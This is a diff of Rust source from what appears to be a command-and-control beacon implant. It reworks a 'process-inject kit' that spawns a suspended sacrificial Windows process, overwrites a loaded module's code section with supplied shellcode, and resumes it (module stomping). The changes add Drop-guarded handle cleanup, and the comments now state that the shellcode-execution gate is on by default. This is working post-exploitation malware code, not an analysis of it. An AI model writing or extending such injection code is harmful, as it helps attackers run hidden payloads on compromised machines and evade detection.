@@ -82,10 +82,12 @@ pub fn sleep(seconds: u32) {
 
 // ---- Process-inject kit --------------------------------------------------
 
-/// Raw Windows `HANDLE` to an injected thread/process. `0` on the not-impl
-/// path; a real impl (module stomping, P2) returns the live handle.
+/// Handle returned by a process-inject kit. Owns the Drop-guarded
+/// [`crate::inject::SacrificialProcess`] — dropping this terminates a
+/// never-resumed sacrificial + closes both handles (module_stomp owns
+/// cleanup), so a kit result can never leak a handle or a suspended process.
 #[allow(dead_code)]
-pub struct InjectedHandle(pub usize);
+pub struct InjectedHandle(pub crate::inject::SacrificialProcess);
 
 /// Spawn-to-shellcode injection extension point (CS ProcessInject kit). The
 /// default impl refuses — the production technique (module stomping) is a P2
@@ -105,17 +107,21 @@ pub trait ProcessInjectKit {
 /// spawn a suspended sacrificial process, stomp a module's `.text` with the
 /// shellcode, and resume. The operator can disarm via
 /// `set_modulestomp_enabled(false)` if the target requires a no-cross-process
-/// footprint, in which case only the suspended sacrificial process handle is
-/// returned (no shellcode executed). Kept as a `ProcessInjectKit` impl so the
-/// postex `inject()` entry routes through the real data path (CreateProcessW)
-/// and the SDK `ModuleStomper` impl stays the single source for the algorithm.
+/// footprint, in which case only the suspended sacrificial process is returned
+/// (no shellcode executed). The returned `InjectedHandle` owns the
+/// Drop-guarded `SacrificialProcess`: dropping it terminates a never-resumed
+/// sacrificial and closes both handles — module_stomp owns cleanup on every
+/// path. Kept as a `ProcessInjectKit` impl so the postex `inject()` entry
+/// routes through the real data path (CreateProcessW) and the SDK
+/// `ModuleStomper` impl stays the single source for the algorithm.
 pub struct ModuleStompKit;
 impl ProcessInjectKit for ModuleStompKit {
     fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
-        // SAFETY: single-threaded beacon context. With the stomp gate ON
-        // (default) this only creates a suspended process — no shellcode runs.
-        let h = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
-        Some(InjectedHandle(h))
+        // SAFETY: single-threaded beacon context. module_stomp owns cleanup
+        // via the Drop-guarded SacrificialProcess (terminate + close on every
+        // non-success path; close-only after a successful resume).
+        let proc = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
+        Some(InjectedHandle(proc))
     }
 }
 
@@ -124,10 +130,11 @@ const PROCESS_INJECT_KIT: ModuleStompKit = ModuleStompKit;
 
 /// Postex-facing injection entry. Routes through the active kit
 /// (`ModuleStompKit` → `crate::inject::module_stomp`). Returns `None` if
-/// CreateProcessW fails (spawn_to missing / blocked); returns a handle to a
-/// SUSPENDED sacrificial process otherwise. The actual .text stomp + resume
-/// runs only when `inject::modulestomp_enabled` is armed (default OFF) — until
-/// then this is the safe data path (no cross-process write/execute).
+/// CreateProcessW fails (spawn_to missing / blocked); otherwise returns an
+/// `InjectedHandle` owning the sacrificial process. The actual .text stomp +
+/// resume runs only when `inject::modulestomp_enabled` is armed (default ON);
+/// disarmed, the returned handle owns a suspended sacrificial that is
+/// terminated + closed when dropped.
 pub fn inject(spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
     PROCESS_INJECT_KIT.inject(spawn_to, shellcode)
 }
